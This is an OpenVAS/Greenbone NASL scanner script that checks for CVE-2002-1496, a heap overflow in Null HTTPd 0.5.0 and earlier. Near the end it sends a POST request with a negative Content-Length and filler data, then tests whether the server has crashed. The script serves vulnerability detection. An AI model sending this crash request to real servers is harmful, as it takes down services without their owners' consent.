# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802923");
  script_version("2023-07-21T05:05:22+0000");
  script_cve_id("CVE-2002-1496");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2012-07-27 11:36:16 +0530 (Fri, 27 Jul 2012)");
  script_name("Null HTTPd Server Content-Length HTTP Header Buffer Overflow Vulnerability");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/10160");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/5774");
  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/bugtraq/2002-09/0284.html");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web Servers");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Null_httpd/banner");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary code on
  the target system or cause the web server to crash.");

  script_tag(name:"affected", value:"Null HTTPd Server version 0.5.0 and prior.");

  script_tag(name:"insight", value:"Improper way of handling of negative 'Content-Length' values in HTTP header
  field, leads to a buffer overflow. By sending an HTTP request with a negative
  value in the 'Content-Length' header field, a remote attacker could overflow
  a buffer and cause the server to crash or execute arbitrary code on the
  system.");

  script_tag(name:"solution", value:"Upgrade Null HTTPd Server to 0.5.1 or later.");

  script_tag(name:"summary", value:"Null HTTPd Server is prone to heap based buffer overflow vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port(default:80);

banner = http_get_remote_headers(port:port);
if(!banner || "Server: Null httpd" >!< banner)
  exit(0);

host = http_host_name(port:port);

data = crap(500);
req = string("POST / HTTP/1.1\r\n",
             "Host: ", host,"\r\n",
             "Content-Length: -1000\r\n\r\n", data);
http_send_recv(port:port, data:req);

if(http_is_dead(port:port)) {
  security_message(port:port);
  exit(0);
}

exit(99);
